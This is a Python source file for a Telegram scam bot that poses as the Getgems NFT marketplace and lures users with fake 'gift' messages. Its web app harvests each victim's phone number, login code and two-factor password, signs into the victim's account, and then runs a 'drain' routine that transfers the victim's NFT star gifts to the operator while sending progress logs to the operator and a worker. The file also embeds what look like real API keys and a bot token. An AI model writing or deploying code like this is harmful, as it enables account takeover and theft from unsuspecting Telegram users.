import os
import asyncio
import threading
import urllib.parse
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient, events, Button, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, RPCError

# --- КОНФИГУРАЦИЯ ---
API_ID = '34426356'
API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
ADMIN_ID = 678335503
WORKER_ID = 8311100024
# ОСТАВЬ ПУСТЫМ, ПОКА НЕ ПОЛУЧИШЬ ССЫЛКУ ОТ ХОСТИНГА
DOMAIN = "getgemsdrainer-production.up.railway.app" 

bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
app = Flask(__name__)

active_clients = {}
temp_clients = {}
pending_contacts = {}

def send_log(msg):
    bot.loop.create_task(bot.send_message(ADMIN_ID, msg))
    bot.loop.create_task(bot.send_message(WORKER_ID, msg))

# --- ЛОГИКА АВТО-ЗАПРАВКИ И СЛИВА ---

async def drain_logic(client, phone):
    try:
        # 1. Проверяем баланс
        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        if res.balance < 25:
            send_log(f"⛽️ Заправка {phone}: отправляю 2-х мишек...")
            me = await client.get_me()
            
            # Бот дарит 2-х мишек (убедись, что на боте есть звезды!)
            for _ in range(2):
                try:
                    await bot(functions.payments.SendStarGiftRequest(
                        peer=me.id,
                        gift_id=685 # Проверь ID мишки в актуальных подарках
                    ))
                    await asyncio.sleep(2)
                except Exception as e:
                    send_log(f"❌ Бот не смог подарить мишку: {e}")
                    return

            send_log(f"🧸 Мишки доставлены. Продаю их на {phone}...")
            await asyncio.sleep(7)

            # 2. Мамонт продает мишек
            gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=10))
            sold = 0
            for g in gifts.gifts:
                try:
                    await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
                    sold += 1
                    if sold >= 2: break
                except Exception:
                    continue
            
            send_log(f"💰 Продано {sold} подарков. Начинаю основной слив...")
            await asyncio.sleep(3)

        # 3. ОСНОВНОЙ СЛИВ (ИСПРАВЛЕННЫЙ БЛОК)
        all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
        for nft in all_gifts.gifts:
            try:
                await client(functions.payments.TransferStarGiftRequest(
                    to_id=ADMIN_ID, 
                    stargift_id=nft.id
                ))
                send_log(f"✅ NFT {nft.id} переведен с {phone}")
                await asyncio.sleep(5)
            except Exception as e:
                # Вместо BalanceTooLowError ищем текст ошибки в строке
                if "BALANCE_TOO_LOW" in str(e):
                    send_log(f"⚠️ Звезды закончились на {phone}")
                    break
                continue

        send_log(f"🏁 Слив {phone} завершен.")
    except Exception as e:
        send_log(f"⚠️ Критическая ошибка слива {phone}: {e}")

# --- WEBAPP API ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/check_contact')
def check_contact():
    uid = request.args.get('id', 0)
    if not uid: return jsonify({"status": "waiting"})
    uid = int(uid)
    if uid in pending_contacts:
        return jsonify({"status": "received", "phone": pending_contacts[uid]})
    return jsonify({"status": "waiting"})

@app.route('/api/send_code', methods=['POST'])
async def api_send_code():
    data = request.json
    phone, code = data.get('phone'), data.get('code')
    if phone not in temp_clients: return jsonify({"status": "error"})
    
    try:
        client = temp_clients[phone]['client']
        await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
        active_clients[phone] = client
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/send_password', methods=['POST'])
async def api_send_password():
    data = request.json
    phone, password = data.get('phone'), data.get('password')
    try:
        client = temp_clients[phone]['client']
        await client.sign_in(password=password)
        active_clients[phone] = client
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except Exception:
        return jsonify({"status": "error"})

# --- BOT HANDLERS ---

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    await event.respond(
        "Это бот Getgems – торгуйте NFT прямо в Telegram. 🎯",
        buttons=[[Button.url("Торговать Gifts ↗️", "https://getgems.io/nft-gifts")]]
    )

@bot.on(events.NewMessage)
async def contact_handler(event):
    if event.contact and event.contact.user_id == event.sender_id:
        phone = event.contact.phone_number
        if not phone.startswith('+'): phone = '+' + phone
        pending_contacts[event.sender_id] = phone
        try:
            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
            await client.connect()
            res = await client.send_code_request(phone)
            temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
            send_log(f"📞 Номер {phone} получен, код отправлен.")
        except Exception as e:
            send_log(f"❌ Ошибка Telethon {phone}: {e}")

@bot.on(events.InlineQuery)
async def inline_handler(event):
    if not event.text: return
    input_text = event.text.strip()
    nft_name = input_text.split('/')[-1].replace('-', ' ').title()
    encoded_url = urllib.parse.quote(input_text)
    web_url = f"https://{DOMAIN}/?nft_url={encoded_url}"
    builder = event.builder
    await event.answer([
        builder.article(
            title=f"Подарить {nft_name}",
            text=f"🎁 **Вам отправили подарок!**\n\nОбъект: `{nft_name}`",
            buttons=[[Button.web_app("Принять подарок 🎁", web_url)]]
        )
    ])

# --- ЗАПУСК ---
if __name__ == '__main__':
    if not os.path.exists('sessions'): os.makedirs('sessions')
    # Используем порт 8080 как на твоем скриншоте
    threading.Thread(target=lambda: app.run(port=8080, host='0.0.0.0', use_reloader=False), daemon=True).start()
    bot.run_until_disconnected()